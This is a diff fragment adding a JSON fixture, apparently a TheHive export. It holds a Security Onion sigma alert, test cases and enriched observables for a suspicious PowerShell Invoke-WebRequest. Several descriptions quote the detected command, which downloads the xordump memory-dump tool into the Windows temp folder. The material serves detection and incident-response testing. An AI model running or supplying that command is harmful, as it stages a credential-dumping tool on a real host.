+        "manageOrchestrator/deleteWorkflows",
+        "manageOrchestrator/deleteVariables",
+        "manageProcedure",
+        "managePage",
+        "manageObservable",
+        "manageCase/delete",
+        "manageCaseReport",
+        "accessTheHiveFS",
+        "manageDashboard",
+        "manageOrchestrator/writeWorkflows",
+        "manageShare",
+        "manageAnalyse",
+        "manageFunction/invoke",
+        "manageTask",
+        "manageCase/merge",
+        "manageOrchestrator/readVariables",
+        "manageCustomEvent",
+        "manageAlert/import",
+        "manageCase/changeOwnership",
+        "manageUser",
+        "manageComment",
+        "manageAlert/reopen",
+        "manageCaseAccess/restrict",
+        "manageTag",
+        "manageConfig",
+        "manageOrchestrator/writeVariables",
+        "managePageTemplate",
+        "manageAlert/create",
+        "manageAlert/delete",
+        "manageCaseReportTemplate",
+        "manageFunction/create",
+        "manageKnowledgeBase",
+        "manageCaseAccess/external",
+        "manageAction",
+        "manageCase/update",
+        "manageCase/reopen"
+      ],
+      "extraData": {},
+      "newDate": 1786579414737,
+      "inProgressDate": 1786579456753,
+      "closedDate": 1786579456753,
+      "alertDate": 1784710559000,
+      "alertNewDate": 1786578743506,
+      "alertInProgressDate": 1786579414734,
+      "alertImportedDate": 1786579414734,
+      "timeToDetect": 1868184506,
+      "timeToTriage": 671228,
+      "timeToQualify": 671228,
+      "timeToAcknowledge": 1868855734,
+      "timeToResolve": 130465,
+      "handlingDuration": 42019
+    }
+  ],
+  "alert_detail": [
+    {
+      "_id": "~4661456",
+      "_type": "Alert",
+      "_createdBy": "analyst@local.com",
+      "_updatedBy": "analyst@local.com",
+      "_createdAt": 1786578743511,
+      "_updatedAt": 1786579414827,
+      "type": "sigma",
+      "source": "security-onion",
+      "sourceRef": "6q290874598745255ON2003",
+      "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+      "description": "Detection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}",
+      "severity": 3,
+      "severityLabel": "HIGH",
+      "date": 1784710559000,
+      "tags": [
+        "172.20.24.99",
+        "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+        "engine:sigma",
+        "rule:Suspicious Invoke-WebRequest Execution",
+        "security-onion",
+        "win-kvkmd51ggkq"
+      ],
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "follow": true,
+      "customFields": [],
+      "observableCount": 4,
+      "caseId": "~8613944",
+      "status": "Imported",
+      "stage": "Imported",
+      "extraData": {},
+      "newDate": 1786578743506,
+      "inProgressDate": 1786579414825,
+      "importedDate": 1786579414825,
+      "timeToDetect": 1868184506,
+      "timeToTriage": 671319,
+      "timeToQualify": 671319,
+      "timeToAcknowledge": 1868855825
+    }
+  ],
+  "alert_observables": [
+    {
+      "_id": "~4554992",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786578743555,
+      "dataType": "hash",
+      "data": "bf7a6e7a62c3f5b2e8e069438ac1dd3d",
+      "startDate": 1786578743555,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [
+        "imphash"
+      ],
+      "ioc": false,
+      "sighted": false,
+      "reports": {
+        "OpenCTI_v6_SearchExactObservable_2_0": {
+          "taxonomies": [
+            {
+              "level": "info",
+              "namespace": "OpenCTI",
+              "predicate": "Search Observable",
+              "value": "Not found"
+            }
+          ]
+        }
+      },
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    },
+    {
+      "_id": "~8880128",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786578743575,
+      "dataType": "url",
+      "data": "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe",
+      "startDate": 1786578743575,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [],
+      "ioc": true,
+      "sighted": false,
+      "reports": {
+        "VirusTotal_Scan_3_1": {
+          "taxonomies": [
+            {
+              "level": "malicious",
+              "namespace": "VT",
+              "predicate": "Scan",
+              "value": "1/92"
+            }
+          ]
+        },
+        "VirusTotal_GetReport_3_1": {
+          "taxonomies": [
+            {
+              "level": "malicious",
+              "namespace": "VT",
+              "predicate": "GetReport",
+              "value": "1/92"
+            }
+          ]
+        },
+        "OpenCTI_v6_SearchExactObservable_2_0": {
+          "taxonomies": [
+            {
+              "level": "info",
+              "namespace": "OpenCTI",
+              "predicate": "Search Observable",
+              "value": "Not found"
+            }
+          ]
+        }
+      },
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    },
+    {
+      "_id": "~4423712",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786578743591,
+      "dataType": "hash",
+      "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
+      "startDate": 1786578743591,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [
+        "sha256"
+      ],
+      "ioc": true,
+      "sighted": false,
+      "reports": {
+        "OpenCTI_v6_SearchExactObservable_2_0": {
+          "taxonomies": [
+            {
+              "level": "info",
+              "namespace": "OpenCTI",
+              "predicate": "Search Observable",
+              "value": "Not found"
+            }
+          ]
+        }
+      },
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    },
+    {
+      "_id": "~8884224",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786578743611,
+      "dataType": "domain",
+      "data": "github.com",
+      "startDate": 1786578743611,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [],
+      "ioc": true,
+      "sighted": false,
+      "reports": {},
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    }
+  ],
+  "closed_cases_by_tag": [
+    {
+      "_id": "~4653208",
+      "_type": "Case",
+      "_createdBy": "analyst@local.com",
+      "_updatedBy": "analyst@local.com",
+      "_createdAt": 1786579478784,
+      "_updatedAt": 1786579502984,
+      "number": 3,
+      "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+      "description": "Detection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}",
+      "severity": 3,
+      "severityLabel": "HIGH",
+      "startDate": 1784710559000,
+      "endDate": 1786579502961,
+      "tags": [
+        "172.20.24.99",
+        "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+        "engine:sigma",
+        "rule:Suspicious Invoke-WebRequest Execution",
+        "security-onion",
+        "win-kvkmd51ggkq"
+      ],
+      "flag": false,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "status": "FalsePositive",
+      "stage": "Closed",
+      "summary": "this case is for test",
+      "assignee": "analyst@local.com",
+      "access": {
+        "_kind": "OrganisationAccessKind"
+      },
+      "customFields": [],
+      "userPermissions": [
+        "manageCase/create",
+        "manageOrchestrator/readWorkflows",
+        "manageAlert/update",
+        "manageCaseTemplate",
+        "manageOrchestrator/deleteWorkflows",
+        "manageOrchestrator/deleteVariables",
+        "manageProcedure",
+        "managePage",
+        "manageObservable",
+        "manageCase/delete",
+        "manageCaseReport",
+        "accessTheHiveFS",
+        "manageDashboard",
+        "manageOrchestrator/writeWorkflows",
+        "manageShare",
+        "manageAnalyse",
+        "manageFunction/invoke",
+        "manageTask",
+        "manageCase/merge",
+        "manageOrchestrator/readVariables",
+        "manageCustomEvent",
+        "manageAlert/import",
+        "manageCase/changeOwnership",
+        "manageUser",
+        "manageComment",
+        "manageAlert/reopen",
+        "manageCaseAccess/restrict",
+        "manageTag",
+        "manageConfig",
+        "manageOrchestrator/writeVariables",
+        "managePageTemplate",
+        "manageAlert/create",
+        "manageAlert/delete",
+        "manageCaseReportTemplate",
+        "manageFunction/create",
+        "manageKnowledgeBase",
+        "manageCaseAccess/external",
+        "manageAction",
+        "manageCase/update",
+        "manageCase/reopen"
+      ],
+      "extraData": {},
+      "newDate": 1786579478777,
+      "inProgressDate": 1786579502963,
+      "closedDate": 1786579502963,
+      "alertDate": 1784710559000,
+      "alertNewDate": 1786578719990,
+      "alertInProgressDate": 1786579478777,
+      "alertImportedDate": 1786579478777,
+      "timeToDetect": 1868160990,
+      "timeToTriage": 758787,
+      "timeToQualify": 758787,
+      "timeToAcknowledge": 1868919777,
+      "timeToResolve": 24184,
+      "handlingDuration": 24186
+    },
+    {
+      "_id": "~8613944",
+      "_type": "Case",
+      "_createdBy": "analyst@local.com",
+      "_updatedBy": "analyst@local.com",
+      "_createdAt": 1786579414752,
+      "_updatedAt": 1786579545235,
+      "number": 2,
+      "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
+      "description": "Detection engine: sigma\nRule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\nHost: win-kvkmd51ggkq (172.20.24.99)\nAgent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\nCommand line: \"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\"\" -OutFile C:\\Windows\\Temp\\xordump.exe}",
+      "severity": 3,
+      "severityLabel": "HIGH",
+      "startDate": 1784710559000,
+      "endDate": 1786579545199,
+      "tags": [
+        "172.20.24.99",
+        "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
+        "engine:sigma",
+        "rule:Suspicious Invoke-WebRequest Execution",
+        "security-onion",
+        "win-kvkmd51ggkq"
+      ],
+      "flag": false,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "status": "TruePositive",
+      "stage": "Closed",
+      "summary": "this closing is only for test",
+      "impactStatus": "WithImpact",
+      "assignee": "analyst@local.com",
+      "access": {
+        "_kind": "OrganisationAccessKind"
+      },
+      "customFields": [],
+      "userPermissions": [
+        "manageCase/create",
+        "manageOrchestrator/readWorkflows",
+        "manageAlert/update",
+        "manageCaseTemplate",
+        "manageOrchestrator/deleteWorkflows",
+        "manageOrchestrator/deleteVariables",
+        "manageProcedure",
+        "managePage",
+        "manageObservable",
+        "manageCase/delete",
+        "manageCaseReport",
+        "accessTheHiveFS",
+        "manageDashboard",
+        "manageOrchestrator/writeWorkflows",
+        "manageShare",
+        "manageAnalyse",
+        "manageFunction/invoke",
+        "manageTask",
+        "manageCase/merge",
+        "manageOrchestrator/readVariables",
+        "manageCustomEvent",
+        "manageAlert/import",
+        "manageCase/changeOwnership",
+        "manageUser",
+        "manageComment",
+        "manageAlert/reopen",
+        "manageCaseAccess/restrict",
+        "manageTag",
+        "manageConfig",
+        "manageOrchestrator/writeVariables",
+        "managePageTemplate",
+        "manageAlert/create",
+        "manageAlert/delete",
+        "manageCaseReportTemplate",
+        "manageFunction/create",
+        "manageKnowledgeBase",
+        "manageCaseAccess/external",
+        "manageAction",
+        "manageCase/update",
+        "manageCase/reopen"
+      ],
+      "extraData": {},
+      "newDate": 1786579414737,
+      "inProgressDate": 1786579456753,
+      "closedDate": 1786579456753,
+      "alertDate": 1784710559000,
+      "alertNewDate": 1786578743506,
+      "alertInProgressDate": 1786579414734,
+      "alertImportedDate": 1786579414734,
+      "timeToDetect": 1868184506,
+      "timeToTriage": 671228,
+      "timeToQualify": 671228,
+      "timeToAcknowledge": 1868855734,
+      "timeToResolve": 130465,
+      "handlingDuration": 42019
+    }
+  ],
+  "open_cases_by_entity": [],
+  "case_observables": [
+    {
+      "_id": "~4669648",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786579480246,
+      "dataType": "hash",
+      "data": "bf7a6e7a62c3f5b2e8e069438ac1dd3d",
+      "startDate": 1786579480246,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [
+        "imphash"
+      ],
+      "ioc": false,
+      "sighted": false,
+      "reports": {},
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    },
+    {
+      "_id": "~4440096",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786579480175,
+      "dataType": "hash",
+      "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
+      "startDate": 1786579480175,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [
+        "sha256"
+      ],
+      "ioc": true,
+      "sighted": false,
+      "reports": {},
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    },
+    {
+      "_id": "~8896512",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786579480201,
+      "dataType": "url",
+      "data": "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe",
+      "startDate": 1786579480201,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [],
+      "ioc": true,
+      "sighted": false,
+      "reports": {},
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    },
+    {
+      "_id": "~4657304",
+      "_type": "Observable",
+      "_createdBy": "analyst@local.com",
+      "_createdAt": 1786579480223,
+      "dataType": "domain",
+      "data": "github.com",
+      "startDate": 1786579480223,
+      "tlp": 2,
+      "tlpLabel": "AMBER",
+      "pap": 2,
+      "papLabel": "AMBER",
+      "tags": [],
+      "ioc": true,
+      "sighted": false,
+      "reports": {},
+      "extraData": {},
+      "ignoreSimilarity": false,
+      "external": false
+    }
+  ]
+}
